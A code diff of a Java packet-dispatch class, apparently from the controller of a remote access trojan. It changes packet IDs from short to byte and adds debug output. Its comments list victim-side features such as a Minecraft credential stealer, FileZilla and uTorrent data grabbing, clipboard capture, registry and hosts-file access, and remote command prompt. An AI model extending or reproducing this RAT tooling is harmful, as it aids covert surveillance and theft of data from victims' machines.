@@ -8,9 +8,9 @@ import com.redpois0n.Slave;
 public class Packets {
 
 	//private static final HashMap<String, Class<? extends AbstractPacket>> incomingPackets = new HashMap<String, Class<? extends AbstractPacket>>();
-	private static final HashMap<Short, Class<? extends AbstractPacket>> incomingPackets = new HashMap<Short, Class<? extends AbstractPacket>>();
+	private static final HashMap<Byte, Class<? extends AbstractPacket>> incomingPackets = new HashMap<Byte, Class<? extends AbstractPacket>>();
 
-	public static HashMap<Short, Class<? extends AbstractPacket>> getIncomingPackets() {
+	public static HashMap<Byte, Class<? extends AbstractPacket>> getIncomingPackets() {
 		return incomingPackets;
 	}
 
@@ -20,126 +20,126 @@ public class Packets {
 
 	private static void reload() {
 		incomingPackets.clear();
-		incomingPackets.put(/* "LOCALE" */(short) 10, PacketLOCALE.class);
-		incomingPackets.put(/* "INSTLOCALES" */(short) 11, PacketINSTLOCALES.class);
-		incomingPackets.put(/* "DISCONNECT" */(short) 12, PacketDISCONNECT.class); // disconnect
-		incomingPackets.put(/* "STAT" */(short) 13, PacketSTAT.class); // status
-		incomingPackets.put(/* "COMPUTERNAME" */(short) 14, PacketCOMPUTERNAME.class); // computername
-		incomingPackets.put(/* "SERVERID" */(short) 15, PacketSERVERID.class); // server
+		incomingPackets.put(/* "LOCALE" */(byte) 10, PacketLOCALE.class);
+		incomingPackets.put(/* "INSTLOCALES" */(byte) 11, PacketINSTLOCALES.class);
+		incomingPackets.put(/* "DISCONNECT" */(byte) 12, PacketDISCONNECT.class); // disconnect
+		incomingPackets.put(/* "STAT" */(byte) 13, PacketSTAT.class); // status
+		incomingPackets.put(/* "COMPUTERNAME" */(byte) 14, PacketCOMPUTERNAME.class); // computername
+		incomingPackets.put(/* "SERVERID" */(byte) 15, PacketSERVERID.class); // server
 																				// id
-		incomingPackets.put(/* "OSNAME" */(short) 16, PacketOSNAME.class); // os
+		incomingPackets.put(/* "OSNAME" */(byte) 16, PacketOSNAME.class); // os
 																			// name
-		incomingPackets.put(/* "IMAGECOMING" */(short) 17, PacketIMAGECOMING.class); // image
-		incomingPackets.put(/* "SINGLEIMAGECOMING" */(short) 18, PacketSINGLEIMAGECOMING.class); // single
+		incomingPackets.put(/* "IMAGECOMING" */(byte) 17, PacketIMAGECOMING.class); // image
+		incomingPackets.put(/* "SINGLEIMAGECOMING" */(byte) 18, PacketSINGLEIMAGECOMING.class); // single
 																									// image
-		incomingPackets.put(/* "FOLDERLIST" */(short) 19, PacketFOLDERLIST.class); // list
+		incomingPackets.put(/* "FOLDERLIST" */(byte) 19, PacketFOLDERLIST.class); // list
 																					// of
 																					// folders
 																					// in
 																					// dir
-		incomingPackets.put(/* "PROCESS" */(short) 20, PacketPROCESS.class); // process
-		incomingPackets.put(/* "CMD" */(short) 21, PacketCMD.class); // command
+		incomingPackets.put(/* "PROCESS" */(byte) 20, PacketPROCESS.class); // process
+		incomingPackets.put(/* "CMD" */(byte) 21, PacketCMD.class); // command
 																		// prompt
 																		// line
-		incomingPackets.put(/* "USERNAME" */(short) 22, PacketUSERNAME.class); // username
-		incomingPackets.put(/* "SERVERPATH" */(short) 23, PacketSERVERPATH.class); // server
+		incomingPackets.put(/* "USERNAME" */(byte) 22, PacketUSERNAME.class); // username
+		incomingPackets.put(/* "SERVERPATH" */(byte) 23, PacketSERVERPATH.class); // server
 																					// path
-		incomingPackets.put(/* "HERERAM" */(short) 24, PacketHERERAM.class); // ram
-		incomingPackets.put(/* "JAVAVER" */(short) 25, PacketJAVAVER.class); // java
+		incomingPackets.put(/* "HERERAM" */(byte) 24, PacketHERERAM.class); // ram
+		incomingPackets.put(/* "JAVAVER" */(byte) 25, PacketJAVAVER.class); // java
 																				// version
-		incomingPackets.put(/* "JAVAPATH" */(short) 26, PacketJAVAPATH.class); // javapath
-		incomingPackets.put(/* "URLSTAT" */(short) 27, PacketURLSTAT.class); // adv
+		incomingPackets.put(/* "JAVAPATH" */(byte) 26, PacketJAVAPATH.class); // javapath
+		incomingPackets.put(/* "URLSTAT" */(byte) 27, PacketURLSTAT.class); // adv
 																				// downloader
 																				// info
-		incomingPackets.put(/* "LOCALIP" */(short) 28, PacketLOCALIP.class); // local
+		incomingPackets.put(/* "LOCALIP" */(byte) 28, PacketLOCALIP.class); // local
 																				// ip
-		incomingPackets.put(/* "FILE" */(short) 29, PacketFILE.class); // file
+		incomingPackets.put(/* "FILE" */(byte) 29, PacketFILE.class); // file
 																		// transfer
-		incomingPackets.put(/* "VERSION" */(short) 30, PacketVERSION.class); // version
-		incomingPackets.put(/* "DATE" */(short) 31, PacketDATE.class); // date
+		incomingPackets.put(/* "VERSION" */(byte) 30, PacketVERSION.class); // version
+		incomingPackets.put(/* "DATE" */(byte) 31, PacketDATE.class); // date
 																		// of
 																		// install
-		incomingPackets.put(/* "VARPROP" */(short) 32, PacketVARPROP.class); // system
+		incomingPackets.put(/* "VARPROP" */(byte) 32, PacketVARPROP.class); // system
 																				// env
 																				// /
 																				// prop
-		incomingPackets.put(/* "THUMBNAIL" */(short) 33, PacketTHUMBNAIL.class); // tumbnail
-		incomingPackets.put(/* "DIR" */(short) 34, PacketDIR.class); // get dir
-		incomingPackets.put(/* "CHAT" */(short) 35, PacketCHAT.class); // chat
-		incomingPackets.put(/* "MC" */(short) 36, PacketMC.class); // minecraft
+		incomingPackets.put(/* "THUMBNAIL" */(byte) 33, PacketTHUMBNAIL.class); // tumbnail
+		incomingPackets.put(/* "DIR" */(byte) 34, PacketDIR.class); // get dir
+		incomingPackets.put(/* "CHAT" */(byte) 35, PacketCHAT.class); // chat
+		incomingPackets.put(/* "MC" */(byte) 36, PacketMC.class); // minecraft
 																	// stealer
-		incomingPackets.put(/* "FF" */(short) 37, PacketFF.class); // file
+		incomingPackets.put(/* "FF" */(byte) 37, PacketFF.class); // file
 																	// finder
-		incomingPackets.put(/* "HOSTF" */(short) 38, PacketHOSTF.class); // host
+		incomingPackets.put(/* "HOSTF" */(byte) 38, PacketHOSTF.class); // host
 																			// file
 																			// text
-		incomingPackets.put(/* "HOSTANSW" */(short) 39, PacketHOSTANSW.class); // host
+		incomingPackets.put(/* "HOSTANSW" */(byte) 39, PacketHOSTANSW.class); // host
 																				// file
 																				// answer
-		incomingPackets.put(/* "UTOR" */(short) 40, PacketUTOR.class); // utorrent
+		incomingPackets.put(/* "UTOR" */(byte) 40, PacketUTOR.class); // utorrent
 																		// logs
-		incomingPackets.put(/* "CBOARDC" */(short) 41, PacketCBOARDC.class); // clipboard
+		incomingPackets.put(/* "CBOARDC" */(byte) 41, PacketCBOARDC.class); // clipboard
 																				// contents
-		incomingPackets.put(/* "FC" */(short) 42, PacketFC.class); // file
+		incomingPackets.put(/* "FC" */(byte) 42, PacketFC.class); // file
 																	// preview
-		incomingPackets.put(/* "IC" */(short) 43, PacketIC.class); // image
+		incomingPackets.put(/* "IC" */(byte) 43, PacketIC.class); // image
 																	// preview
-		incomingPackets.put(/* "JVM" */(short) 44, PacketJVM.class); // JVM info
-		incomingPackets.put(/* "ZIP" */(short) 45, PacketZIP.class); // zip
+		incomingPackets.put(/* "JVM" */(byte) 44, PacketJVM.class); // JVM info
+		incomingPackets.put(/* "ZIP" */(byte) 45, PacketZIP.class); // zip
 																		// preview
-		incomingPackets.put(/* "MD5" */(short) 46, PacketMD5.class); // file md5
-		incomingPackets.put(/* "COUNTRY" */(short) 47, PacketCOUNTRY.class); // user.country
+		incomingPackets.put(/* "MD5" */(byte) 46, PacketMD5.class); // file md5
+		incomingPackets.put(/* "COUNTRY" */(byte) 47, PacketCOUNTRY.class); // user.country
 																				// backup
-		incomingPackets.put(/* "FZ" */(short) 48, PacketFZ.class); // filezilla
-		incomingPackets.put(/* "LAN" */(short) 49, PacketLAN.class); // lan view
-		incomingPackets.put(/* "IPC" */(short) 50, PacketIPC.class); // ipconfig
-		incomingPackets.put(/* "APORT" */(short) 51, PacketAPORT.class); // active
+		incomingPackets.put(/* "FZ" */(byte) 48, PacketFZ.class); // filezilla
+		incomingPackets.put(/* "LAN" */(byte) 49, PacketLAN.class); // lan view
+		incomingPackets.put(/* "IPC" */(byte) 50, PacketIPC.class); // ipconfig
+		incomingPackets.put(/* "APORT" */(byte) 51, PacketAPORT.class); // active
 																			// port
-		incomingPackets.put(/* "WINSER" */(short) 52, PacketWINSER.class); // windows
+		incomingPackets.put(/* "WINSER" */(byte) 52, PacketWINSER.class); // windows
 																			// service
 																			// listing
-		incomingPackets.put(/* "REGSTART" */(short) 53, PacketREGSTART.class); // registry
+		incomingPackets.put(/* "REGSTART" */(byte) 53, PacketREGSTART.class); // registry
 																				// startup
 																				// listing
-		incomingPackets.put(/* "REG" */(short) 54, PacketREG.class); // registry
+		incomingPackets.put(/* "REG" */(byte) 54, PacketREG.class); // registry
 																		// enter
-		incomingPackets.put(/* "INSTPROG" */(short) 55, PacketINSTPROG.class); // installed
+		incomingPackets.put(/* "INSTPROG" */(byte) 55, PacketINSTPROG.class); // installed
 																				// program
 																				// list
-		incomingPackets.put(/* "ADAPT" */(short) 56, PacketADAPT.class); // network
+		incomingPackets.put(/* "ADAPT" */(byte) 56, PacketADAPT.class); // network
 																			// adapters
 																			// list
-		incomingPackets.put(/* "RAWINFO" */(short) 57, PacketRAWINFO.class); // raw
+		incomingPackets.put(/* "RAWINFO" */(byte) 57, PacketRAWINFO.class); // raw
 																				// info
 																				// listing
-		incomingPackets.put(/* "SO" */(short) 58, PacketSO.class); // sound
-		incomingPackets.put(/* "IMGLIST" */(short) 59, PacketIMGLIST.class); // thumbnail
+		incomingPackets.put(/* "SO" */(byte) 58, PacketSO.class); // sound
+		incomingPackets.put(/* "IMGLIST" */(byte) 59, PacketIMGLIST.class); // thumbnail
 																				// preview
-		incomingPackets.put(/* "ERROR" */(short) 60, PacketERROR.class); // error
-		incomingPackets.put(/* "MONITOR" */(short) 61, PacketMONITOR.class); // monitors
+		incomingPackets.put(/* "ERROR" */(byte) 60, PacketERROR.class); // error
+		incomingPackets.put(/* "MONITOR" */(byte) 61, PacketMONITOR.class); // monitors
 																				// listing
-		incomingPackets.put(/* "DRIVES" */(short) 62, PacketDRIVES.class); // drives
+		incomingPackets.put(/* "DRIVES" */(byte) 62, PacketDRIVES.class); // drives
 																			// listing
-		incomingPackets.put(/* "RAM" */(short) 63, PacketRAM.class); // ram
-		incomingPackets.put(/* "APS" */(short) 64, PacketAPS.class); // available
+		incomingPackets.put(/* "RAM" */(byte) 63, PacketRAM.class); // ram
+		incomingPackets.put(/* "APS" */(byte) 64, PacketAPS.class); // available
 																		// processors
-		incomingPackets.put(/* "ERRLOG" */(short) 65, PacketERRLOG.class); // error
+		incomingPackets.put(/* "ERRLOG" */(byte) 65, PacketERRLOG.class); // error
 																			// log
 																			// file
-		incomingPackets.put(/* "CONFIG" */(short) 66, PacketCONFIG.class); // config
+		incomingPackets.put(/* "CONFIG" */(byte) 66, PacketCONFIG.class); // config
 																			// list
-		incomingPackets.put(/* "PLUGIN" */(short) 67, PacketPLUGIN.class); // plugin
+		incomingPackets.put(/* "PLUGIN" */(byte) 67, PacketPLUGIN.class); // plugin
 																			// list
-		incomingPackets.put(/* "QUICKDESKTOP" */(short) 68, PacketQUICKDESKTOP.class); // quick
+		incomingPackets.put(/* "QUICKDESKTOP" */(byte) 68, PacketQUICKDESKTOP.class); // quick
 																						// desktop
 	}
 
-	public static boolean execute(short line, Slave slave) {
+	public static boolean execute(byte line, Slave slave) {
 		try {
 			AbstractPacket ac = null;
-			Set<Short> set = incomingPackets.keySet();
-			for (Short str : set) {
-				if (str.equals(line)) {
+			Set<Byte> set = incomingPackets.keySet();
+			for (Byte str : set) {
+				if (str == line) {
 					ac = incomingPackets.get(str).newInstance();
 					break;
 				}
@@ -150,8 +150,11 @@ public class Packets {
 				} else if (line.equals("SO")) {
 					PacketSO.handle(slave);
 				} else {*/
+				System.out.println(ac.getClass().getSimpleName());
 					ac.read(slave, line + "");
 				//}
+			} else {
+				System.out.println("ac is null: " + line);
 			}
 
 			// TODO PluginEventHandler.onPacket(slave, line); 
